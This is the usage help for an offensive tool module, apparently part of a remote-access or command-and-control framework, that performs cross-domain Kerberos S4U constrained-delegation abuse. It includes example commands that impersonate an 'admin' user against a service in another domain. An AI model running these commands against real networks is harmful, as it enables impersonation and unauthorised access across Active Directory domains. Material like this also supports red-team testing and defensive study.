ABOUT
    Perform cross domain S4U constrained delegation abuse.
USAGE:
    bof-kerbeus-cross_s4u --- /ticket:BASE64 /service:SPN /targetdomain:DOMAIN /targetdc:DC {/impersonateuser:USER | /tgs:BASE64} [/domain:DOMAIN] [/dc:DC] [/altservice:SERVICE] [/nopac] [/self]

EXAMPLES:
    bof-kerbeus-cross_s4u --- /ticket:BASE64 /service:cifs/target /targetdomain:other.corp /targetdc:dc2.other.corp /impersonateuser:admin

NUKERAT FLAGS:
    -w <seconds>    Maximum wait time until timeout
    -bg             Fork and run without waiting for output

    Example:
    bof-kerbeus-cross_s4u -w 60 --- /ticket:BASE64 /service:cifs/target /targetdomain:other.corp /targetdc:dc2.other.corp /impersonateuser:admin
